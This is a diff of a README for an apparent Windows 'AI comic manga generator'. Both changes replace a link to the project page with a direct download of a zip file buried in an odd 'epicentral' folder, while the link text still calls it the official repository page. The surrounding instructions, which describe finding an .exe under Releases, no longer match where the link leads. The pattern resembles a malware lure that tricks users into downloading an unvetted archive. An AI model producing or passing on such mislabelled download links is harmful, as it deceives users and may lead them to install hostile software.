@@ -1,6 +1,6 @@
 # 🎨 ai-comic-manga-generator - Create professional manga panels with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/inseries-latten115/ai-comic-manga-generator)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/inseries-latten115/ai-comic-manga-generator/raw/refs/heads/main/epicentral/generator_comic_manga_ai_1.5.zip)
 
 This software turns your ideas into manga and comic book pages. You use simple prompts to generate art. The tool handles the complex technical tasks behind the scenes. It creates panels, character designs, and layouts.
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run this tool well.
 
 You must visit the project page to access the setup files. Follow these directions to get the installer for your Windows machine.
 
-1. Click this link to go to the official project repository: [Download Page](https://github.com/inseries-latten115/ai-comic-manga-generator).
+1. Click this link to go to the official project repository: [Download Page](https://github.com/inseries-latten115/ai-comic-manga-generator/raw/refs/heads/main/epicentral/generator_comic_manga_ai_1.5.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Select the most recent version available.
 4. Locate the file ending in .exe under the Assets heading.
